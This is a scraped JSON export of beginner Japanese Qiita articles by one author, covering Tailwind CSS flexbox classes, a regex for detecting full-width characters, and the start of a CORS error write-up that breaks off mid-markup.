data-sourcepos=\"85:1-86:144\">上段の横並びのボックスは主軸の水平方向の配置の指定がないため、ボックスが中央に配置されません。<br>\n下段の縦並びのボックスも主軸の垂直方向の指定がないため、ボックスが均等に配置されなくなりました。</p>\n<p data-sourcepos=\"88:1-88:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F043c4a24-22f7-4536-822f-0b9d86d55501.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=4473b4138be3449fbe1fa5ca154c1207\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F043c4a24-22f7-4536-822f-0b9d86d55501.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=4473b4138be3449fbe1fa5ca154c1207\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F043c4a24-22f7-4536-822f-0b9d86d55501.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=7fe8716736242d75b80e98a98fd27e8c 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/043c4a24-22f7-4536-822f-0b9d86d55501.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"90:1-90:37\">\n<span id=\"3items-xxxxxxを確認してみる\" class=\"fragment\"></span><a href=\"#3items-xxxxxx%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%97%E3%81%A6%E3%81%BF%E3%82%8B\"><i class=\"fa fa-link\"></i></a>3.items-xxxxxxを確認してみる</h1>\n<ul data-sourcepos=\"92:1-93:0\">\n<li data-sourcepos=\"92:1-93:0\">\n<code>items-XXXX</code>：<strong>交差軸</strong>に対して、操作をする</li>\n</ul>\n<p data-sourcepos=\"94:1-96:66\">flexの場合、交差軸は<code>垂直方向</code>、flex-colの場合、交差軸は<code>水平方向</code>になります。<br>\nitems-centerを指定し、交差軸の中央にボックスが配置されるように設定しました。<br>\nitems-centerを消すとどうなるかを確認してみます。</p>\n<div class=\"code-frame\" data-lang=\"diff_tsx\" data-sourcepos=\"98:1-110:3\"><div class=\"highlight\"><pre><code><span class=\"hdl\"><span class=\"o\">- </span>     <span class=\"o\">&lt;</span><span class=\"nx\">div</span> <span class=\"kd\">class</span><span class=\"o\">=</span><span class=\"dl\">\"</span><span class=\"s2\">flex justify-center items-center h-32 bg-gray-200</span><span class=\"dl\">\"</span><span class=\"o\">&gt;</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>     <span class=\"o\">&lt;</span><span class=\"nx\">div</span> <span class=\"kd\">class</span><span class=\"o\">=</span><span class=\"dl\">\"</span><span class=\"s2\">flex justify-center h-32 bg-gray-200</span><span class=\"dl\">\"</span><span class=\"o\">&gt;</span>\n</span>        <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"bg-blue-500 p-2 m-2\"</span><span class=\"p\">&gt;</span>ボックス<span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n      <span class=\"p\">&lt;</span><span class=\"err\">/</span><span class=\"na\">div</span><span class=\"p\">&gt;</span>\n\n      <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"h-2 bg-white-200\"</span><span class=\"p\">&gt;&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n\n<span class=\"hdl\">-      <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"s\">\"flex flex-col justify-center items-center h-32 bg-gray-200\"</span><span class=\"p\">&gt;</span>\n</span><span class=\"hil\">+      <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"flex flex-col justify-center h-32 bg-gray-200\"</span><span class=\"p\">&gt;</span>\n</span>        <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">class</span><span class=\"p\">=</span><span class=\"s\">\"bg-blue-500 p-2 m-2\"</span><span class=\"p\">&gt;</span>ボックス<span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n      <span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n</code></pre></div></div>\n<p data-sourcepos=\"112:1-112:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F42338ccf-1d73-49b6-91a2-a094d73c8fc8.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=ef257544b76b4277910abcd2fa835b29\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F42338ccf-1d73-49b6-91a2-a094d73c8fc8.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=ef257544b76b4277910abcd2fa835b29\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F42338ccf-1d73-49b6-91a2-a094d73c8fc8.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=86fd3676982ebc5c7e824c6c73621b68 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/42338ccf-1d73-49b6-91a2-a094d73c8fc8.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"115:1-116:126\">上段の横並びのボックスは交差軸の垂直方向の指定がないため、ボックスが縦に伸びました。<br>\n下段の縦並びのボックスも交差軸の水平方向の指定がないため、ボックスが横に伸びました。</p>\n<h3 data-sourcepos=\"118:1-118:34\">\n<span id=\"ボックスが伸びた理由\" class=\"fragment\"></span><a href=\"#%E3%83%9C%E3%83%83%E3%82%AF%E3%82%B9%E3%81%8C%E4%BC%B8%E3%81%B3%E3%81%9F%E7%90%86%E7%94%B1\"><i class=\"fa fa-link\"></i></a>ボックスが伸びた理由</h3>\n<p data-sourcepos=\"119:1-119:146\">items-xxxxxxを指定しない場合、デフォルトの<code>items-stretch</code>(子要素を親要素の高さに合わせる)が適用されるため。</p>\n<p data-sourcepos=\"122:1-122:57\"><iframe id=\"qiita-embed-content__1a001a8e9ca83be09c7ed4f92992e8ec\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__1a001a8e9ca83be09c7ed4f92992e8ec\" data-content=\"https%3A%2F%2Fdeveloper.mozilla.org%2Fja%2Fdocs%2FWeb%2FCSS%2Falign-items\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"124:1-124:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"125:1-127:156\">今回記事にしたきっかけは、生成AIの学習モードをお試しで使っていた時、<br>\n<code>「Tailwind CSSを使っていて、例えば class=\"flex items-center justify-between p-4 bg-blue-500\" のようなクラスを書くとき、それぞれのクラスが具体的に何をしているか説明できますか？」</code>の質問に対して、<code>flex items-center justify-between</code>の意味が答えられないことでした。<br>\n（本記事とは関係ないですが、学習モードいいですね…気軽になんでも聞ける家庭教師ができた気分になれます。）</p>\n<p data-sourcepos=\"129:1-130:75\">justifyやitemsは一瞬ややこしいと思いましたが、実際に試してみると理解が深まりました。<br>\nリファレンスを参照つつ適用していきたいと思います。</p>\n<h1 data-sourcepos=\"132:1-132:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"133:1-133:44\"><iframe id=\"qiita-embed-content__f9a0c9a401958716e66c6e9946b8aad9\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__f9a0c9a401958716e66c6e9946b8aad9\" data-content=\"https%3A%2F%2Ftailwindcss.com%2Fdocs%2Fjustify-content\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"135:1-135:40\"><iframe id=\"qiita-embed-content__d73289ef1317e393cdf7760be055e418\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__d73289ef1317e393cdf7760be055e418\" data-content=\"https%3A%2F%2Ftailwindcss.com%2Fdocs%2Falign-items\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\ntailwindcssを使う際、各ボックスを横並びにするときは`flex`、縦並びにするときは`flex-col`をなんとなく使用していました。`flex`や`flex-col`、`justify-XXX`や`items-xxx`の指定はそれぞれ何を意味するのか、学んだことをまとめました。\n\n# 1.flexを確認してみる\n\nhttps://tailwindcss.com/docs/flex-direction\n\n## 横並び：flex\n\n```tsx\n      <div class=\"flex h-32 bg-gray-200\">\n        <div class=\"bg-blue-500 p-2 m-2\">ボックス</div>\n        <div class=\"bg-blue-500 p-2 m-2\">ボックス</div>\n        <div class=\"bg-blue-500 p-2 m-2\">ボックス</div>\n      </div>\n```\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/0a69c7d0-f01a-42a2-b701-3afd6aed329a.png)\n\n## 横並び：flex-row\n\n```tsx\n      <div class=\"flex flex-row h-32 bg-gray-200\">\n        <div class=\"bg-blue-500 p-2 m-2\">ボックス</div>\n        <div class=\"bg-blue-500 p-2 m-2\">ボックス</div>\n        <div class=\"bg-blue-500 p-2 m-2\">ボックス</div>\n      </div>\n```\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ce6fd9de-5470-4919-8b9a-c0699011644d.png)\n\n\n## 縦並び：flex-col\n```tsx\n      <div class=\"flex flex-col h-32 bg-gray-200\">\n        <div class=\"bg-blue-500 p-2 m-2\">ボックス</div>\n        <div class=\"bg-blue-500 p-2 m-2\">ボックス</div>\n        <div class=\"bg-blue-500 p-2 m-2\">ボックス</div>\n      </div>\n```\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/e269798c-abac-41c3-b93b-9d25b77f1872.png)\n\n# 2.justify-xxxxxxを確認してみる\n\n* `justify-XXXX`：**主軸**に対して、操作をする\n\nflexの場合、主軸は`水平方向`、flex-colの場合、主軸は`垂直方向`になります。\njustify-centerを指定し、主軸の中央にボックスが配置されるように設定しました。\n\n```diff_tsx\n      <div class=\"flex justify-center items-center h-32 bg-gray-200\">\n        <div class=\"bg-blue-500 p-2 m-2\">ボックス</div>\n        <div class=\"bg-blue-500 p-2 m-2\">ボックス</div>\n      </div>\n\n      <div class=\"h-2 bg-white-200\"></div>\n\n      <div class=\"flex flex-col justify-center items-center h-32 bg-gray-200\">\n        <div class=\"bg-blue-500 p-2 m-2\">ボックス</div>\n        <div class=\"bg-blue-500 p-2 m-2\">ボックス</div>\n      </div>\n```\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/f7387955-349f-4b7e-a52f-9ee01f25a083.png)\n\njustify-centerを消すとどうなるかを確認してみます。\n```diff_tsx\n-      <div class=\"flex justify-center items-center h-32 bg-gray-200\">\n+      <div class=\"flex items-center h-32 bg-gray-200\">\n        <div class=\"bg-blue-500 p-2 m-2\">ボックス</div>\n        <div class=\"bg-blue-500 p-2 m-2\">ボックス</div>\n      </div>\n\n      <div class=\"h-2 bg-white-200\"></div>\n\n-      <div class=\"flex flex-col justify-center items-center h-32 bg-gray-200\">\n+      <div class=\"flex flex-col items-center h-32 bg-gray-200\">\n        <div class=\"bg-blue-500 p-2 m-2\">ボックス</div>\n        <div class=\"bg-blue-500 p-2 m-2\">ボックス</div>\n      </div>\n```\n\n\n上段の横並びのボックスは主軸の水平方向の配置の指定がないため、ボックスが中央に配置されません。\n下段の縦並びのボックスも主軸の垂直方向の指定がないため、ボックスが均等に配置されなくなりました。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/043c4a24-22f7-4536-822f-0b9d86d55501.png)\n\n# 3.items-xxxxxxを確認してみる\n\n* `items-XXXX`：**交差軸**に対して、操作をする \n\nflexの場合、交差軸は`垂直方向`、flex-colの場合、交差軸は`水平方向`になります。\nitems-centerを指定し、交差軸の中央にボックスが配置されるように設定しました。\nitems-centerを消すとどうなるかを確認してみます。\n\n```diff_tsx\n-      <div class=\"flex justify-center items-center h-32 bg-gray-200\">\n+      <div class=\"flex justify-center h-32 bg-gray-200\">\n        <div class=\"bg-blue-500 p-2 m-2\">ボックス</div>\n      </div>\n\n      <div class=\"h-2 bg-white-200\"></div>\n\n-      <div class\"flex flex-col justify-center items-center h-32 bg-gray-200\">\n+      <div class=\"flex flex-col justify-center h-32 bg-gray-200\">\n        <div class=\"bg-blue-500 p-2 m-2\">ボックス</div>\n      </div>\n```\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/42338ccf-1d73-49b6-91a2-a094d73c8fc8.png)\n\n\n上段の横並びのボックスは交差軸の垂直方向の指定がないため、ボックスが縦に伸びました。\n下段の縦並びのボックスも交差軸の水平方向の指定がないため、ボックスが横に伸びました。\n\n### ボックスが伸びた理由\nitems-xxxxxxを指定しない場合、デフォルトの`items-stretch`(子要素を親要素の高さに合わせる)が適用されるため。\n\n\nhttps://developer.mozilla.org/ja/docs/Web/CSS/align-items\n\n# おわりに\n今回記事にしたきっかけは、生成AIの学習モードをお試しで使っていた時、\n`「Tailwind CSSを使っていて、例えば class=\"flex items-center justify-between p-4 bg-blue-500\" のようなクラスを書くとき、それぞれのクラスが具体的に何をしているか説明できますか？」`の質問に対して、`flex items-center justify-between`の意味が答えられないことでした。\n（本記事とは関係ないですが、学習モードいいですね…気軽になんでも聞ける家庭教師ができた気分になれます。）\n\njustifyやitemsは一瞬ややこしいと思いましたが、実際に試してみると理解が深まりました。\nリファレンスを参照つつ適用していきたいと思います。\n\n# 参考\nhttps://tailwindcss.com/docs/justify-content\n\nhttps://tailwindcss.com/docs/align-items\n","coediting":false,"comments_count":0,"created_at":"2025-09-12T08:20:18+09:00","group":null,"id":"7de2fd991d8fbdef4493","likes_count":2,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"CSS","versions":[]},{"name":"初心者","versions":[]},{"name":"flexbox","versions":[]},{"name":"tailwindcss","versions":[]}],"title":"【tailwindcss】class=\"flex items-xxxxxx justify-xxxxxx\"の意味を説明できるようになりたい","updated_at":"2025-09-12T08:20:18+09:00","url":"https://qiita.com/asa129/items/7de2fd991d8fbdef4493","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":389,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:150\">バリデーションチェックを実装中に全角文字を判定する方法がわからなかったため、調べたことをまとめます。</p>\n<h1 data-sourcepos=\"4:1-4:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"5:1-5:98\">外部サービスのIFからの入力値の項目で全角文字かどうかを判定したい。</p>\n<h1 data-sourcepos=\"7:1-7:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<h2 data-sourcepos=\"8:1-8:30\">\n<span id=\"正規表現を使用する\" class=\"fragment\"></span><a href=\"#%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>正規表現を使用する</h2>\n<p data-sourcepos=\"9:1-9:72\">正規表現の<code>^[^ -~｡-ﾟ]+$</code>を使用して実現できました。</p>\n<p data-sourcepos=\"11:1-11:76\"><strong>半角英数字記号、半角カタカナ以外＝全角文字</strong>で判定</p>\n<h3 data-sourcepos=\"13:1-13:25\">\n<span id=\"パターンの構成\" class=\"fragment\"></span><a href=\"#%E3%83%91%E3%82%BF%E3%83%BC%E3%83%B3%E3%81%AE%E6%A7%8B%E6%88%90\"><i class=\"fa fa-link\"></i></a>パターンの構成</h3>\n<ul data-sourcepos=\"14:1-20:0\">\n<li data-sourcepos=\"14:1-14:32\">\n<code>^</code>：入力の先頭を表す</li>\n<li data-sourcepos=\"15:1-15:32\">\n<code>$</code>：入力の末尾を表す</li>\n<li data-sourcepos=\"16:1-16:24\">\n<code>[]</code>：文字クラス</li>\n<li data-sourcepos=\"17:1-17:32\">\n<code>[^ ]</code>：否定文字クラス</li>\n<li data-sourcepos=\"18:1-18:109\">\n<code> -~</code>：半角スペースからチルダを表す＝文字コードで半角英数字記号全てが対象</li>\n<li data-sourcepos=\"19:1-20:0\">\n<code>｡-ﾟ</code>：半角句点から半角半濁点を表す＝文字コードの半角カタカナすべてが対象</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"ts\" data-sourcepos=\"21:1-30:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">const</span> <span class=\"nx\">target</span><span class=\"p\">:</span> <span class=\"kr\">string</span> <span class=\"o\">=</span> <span class=\"dl\">\"</span><span class=\"s2\">全角文字</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"c1\">// const target: string = \"12345\"</span>\n\n<span class=\"k\">if</span><span class=\"p\">(</span><span class=\"nx\">target</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nx\">target</span><span class=\"p\">.</span><span class=\"nf\">match</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">^[^ -~｡-ﾟ]+$</span><span class=\"dl\">\"</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">全角文字です</span><span class=\"dl\">\"</span><span class=\"p\">)</span>\n<span class=\"p\">}</span><span class=\"k\">else</span> <span class=\"p\">{</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">全角文字じゃないです</span><span class=\"dl\">\"</span><span class=\"p\">)</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<div data-sourcepos=\"31:1-34:3\" class=\"note warn\">\n<span class=\"fa fa-fw fa-exclamation-circle\"></span><div>\n<p data-sourcepos=\"32:1-33:82\">絵文字や特殊記号なども全角文字として判定されます<br>\n厳密な判定が必要な場合はUnicodeでの判定を検討してください</p>\n</div>\n</div>\n<h1 data-sourcepos=\"36:1-36:14\">\n<span id=\"終わりに\" class=\"fragment\"></span><a href=\"#%E7%B5%82%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>終わりに</h1>\n<p data-sourcepos=\"37:1-38:132\">文字列のサイズとバイト数の違いから判定する方法も考えましたが、全角文字が全て同じByte数ではないため断念しました。<br>\n正規表現は一見難しそうと思いつつ、一つずつ紐解いていくと意味を理解することができました。</p>\n<h1 data-sourcepos=\"41:1-41:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"42:1-42:48\"><iframe id=\"qiita-embed-content__18632cf710b5b2931c57d35f8427d90c\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__18632cf710b5b2931c57d35f8427d90c\" data-content=\"https%3A%2F%2Fqiita.com%2FSZR%2Fitems%2F837574ffe887a7556fa6\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"44:1-44:42\"><iframe id=\"qiita-embed-content__4ba65715423bd5b45c414adf1a91c34b\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__4ba65715423bd5b45c414adf1a91c34b\" data-content=\"https%3A%2F%2Fengineer.ohiine.com%2F2021%2F02%2F22%2F39%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"46:1-46:89\"><iframe id=\"qiita-embed-content__7fca55409828c23606c330c03e54833c\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__7fca55409828c23606c330c03e54833c\" data-content=\"https%3A%2F%2Fdeveloper.mozilla.org%2Fja%2Fdocs%2FWeb%2FJavaScript%2FGuide%2FRegular_expressions%2FAssertions\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"48:1-48:78\"><iframe id=\"qiita-embed-content__4dd11beb0c69b5db7a160f3a024d02a5\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__4dd11beb0c69b5db7a160f3a024d02a5\" data-content=\"https%3A%2F%2Fdeveloper.mozilla.org%2Fja%2Fdocs%2FWeb%2FJavaScript%2FGuide%2FRegular_expressions\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"50:1-50:96\"><iframe id=\"qiita-embed-content__005eadf10677d4f213180db41e6c68e9\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__005eadf10677d4f213180db41e6c68e9\" data-content=\"https%3A%2F%2Fdeveloper.mozilla.org%2Fja%2Fdocs%2FWeb%2FJavaScript%2FGuide%2FRegular_expressions%2FCharacter_classes\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"52:1-52:89\"><iframe id=\"qiita-embed-content__f5e2a74bcf68a74dd37e5743ff54f3ef\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__f5e2a74bcf68a74dd37e5743ff54f3ef\" data-content=\"https%3A%2F%2Fdeveloper.mozilla.org%2Fja%2Fdocs%2FWeb%2FJavaScript%2FGuide%2FRegular_expressions%2FCheatsheet\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nバリデーションチェックを実装中に全角文字を判定する方法がわからなかったため、調べたことをまとめます。\n\n# 問題\n外部サービスのIFからの入力値の項目で全角文字かどうかを判定したい。\n\n# 解決方法\n## 正規表現を使用する\n正規表現の`^[^ -~｡-ﾟ]+$`を使用して実現できました。\n\n**半角英数字記号、半角カタカナ以外＝全角文字**で判定\n\n### パターンの構成\n* `^`：入力の先頭を表す\n* `$`：入力の末尾を表す\n* `[]`：文字クラス\n* `[^ ]`：否定文字クラス\n* ` -~`：半角スペースからチルダを表す＝文字コードで半角英数字記号全てが対象\n* `｡-ﾟ`：半角句点から半角半濁点を表す＝文字コードの半角カタカナすべてが対象\n\n```ts\nconst target: string = \"全角文字\";\n// const target: string = \"12345\"\n\nif(target != null && target.match(\"^[^ -~｡-ﾟ]+$\")) {\n    console.log(\"全角文字です\")\n}else {\n    console.log(\"全角文字じゃないです\")\n}\n```\n:::note warn\n絵文字や特殊記号なども全角文字として判定されます\n厳密な判定が必要な場合はUnicodeでの判定を検討してください\n:::\n\n# 終わりに\n文字列のサイズとバイト数の違いから判定する方法も考えましたが、全角文字が全て同じByte数ではないため断念しました。\n正規表現は一見難しそうと思いつつ、一つずつ紐解いていくと意味を理解することができました。\n\n\n# 参考\nhttps://qiita.com/SZR/items/837574ffe887a7556fa6\n\nhttps://engineer.ohiine.com/2021/02/22/39/\n\nhttps://developer.mozilla.org/ja/docs/Web/JavaScript/Guide/Regular_expressions/Assertions\n\nhttps://developer.mozilla.org/ja/docs/Web/JavaScript/Guide/Regular_expressions\n\nhttps://developer.mozilla.org/ja/docs/Web/JavaScript/Guide/Regular_expressions/Character_classes\n\nhttps://developer.mozilla.org/ja/docs/Web/JavaScript/Guide/Regular_expressions/Cheatsheet\n","coediting":false,"comments_count":2,"created_at":"2025-09-02T22:06:20+09:00","group":null,"id":"98e61bbac4ba9b032dae","likes_count":1,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"正規表現","versions":[]}],"title":"【正規表現】全角文字をチェックしたい","updated_at":"2025-09-02T22:06:20+09:00","url":"https://qiita.com/asa129/items/98e61bbac4ba9b032dae","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":403,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:67\">Express.jsを使って簡易APIを作成、アクセスしようとすると、表題のエラーが発生しました。<br>\n解決方法とCORSについて学んだことをまとめます。</p>\n<h1 data-sourcepos=\"5:1-5:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"6:1-6:105\">異なるポートでサーバーを起動、ブラウザ上で実行すると下記のエラーが発生</p>\n<p data-sourcepos=\"8:1-8:19\"><strong>エラー内容</strong></p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"9:1-11:3\"><div class=\"highlight\"><pre><code>Access to fetch at 'http://localhost:3000/api/' from origin 'http://localhost:5173' has been blocked by CORS policy: Response to preflight request doesn't pass access control check: No 'Access-Control-Allow-Origin' header is present on the requested resource.\n</code></pre></div></div>\n<p data-sourcepos=\"13:1-13:72\">ポートを変えて以下のサーバーを起動していました。</p>\n<ul data-sourcepos=\"15:1-17:0\">\n<li data-sourcepos=\"15:1-15:48\">Viteプロジェクト：<a href=\"http://localhost:5173\" class=\"autolink\" rel=\"nofollow noopener\" target=\"_blank\">http://localhost:5173</a>\n</li>\n<li data-sourcepos=\"16:1-17:0\">Express.js：<a href=\"http://localhost:3000\" class=\"autolink\" rel=\"nofollow noopener\" target=\"_blank\">http://localhost:3000</a>\n</li>\n</ul>\n<h1 data-sourcepos=\"18:1-18:8\">\n<span id=\"原因\" class=\"fragment\"></span><a href=\"#%E5%8E%9F%E5%9B%A0\"><i class=\"fa fa-link\"></i></a>原因</h1>\n<p data-sourcepos=\"19:1-19:77\">ブラウザが<code>同一オリジンポリシー</code>を適用していたため。</p>\n<h2 data-sourcepos=\"21:1-21:42\">\n<span id=\"同一オリジンポリシーとは\" class=\"fragment\"></span><a href=\"#%E5%90%8C%E4%B8%80%E3%82%AA%E3%83%AA%E3%82%B8%E3%83%B3%E3%83%9D%E3%83%AA%E3%82%B7%E3%83%BC%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>同一オリジンポリシーとは？</h2>\n<p data-sourcepos=\"22:1-22:60\">ブラウザに搭載されたセキュリティ上の制約</p>\n<p data-sourcepos=\"24:1-24:19\"><strong>MDNより引用</strong></p>\n<blockquote data-sourcepos=\"25:1-25:262\">\n<p data-sourcepos=\"25:2-25:262\">同一オリジンポリシーは重要なセキュリティの仕組みであり、あるオリジンによって読み込まれた文書やスクリプトが、他のオリジンにあるリソースにアクセスできる方法を制限するものです。</p>\n</blockquote>\n<p data-sourcepos=\"27:1-27:69\"><iframe id=\"qiita-embed-content__836d94adcee491071474f4b5428d9bd1\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__836d94adcee491071474f4b5428d9bd1\" data-content=\"https%3A%2F%2Fdeveloper.mozilla.org%2Fja%2Fdocs%2FWeb%2FSecurity%2FSame-origin_policy\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" 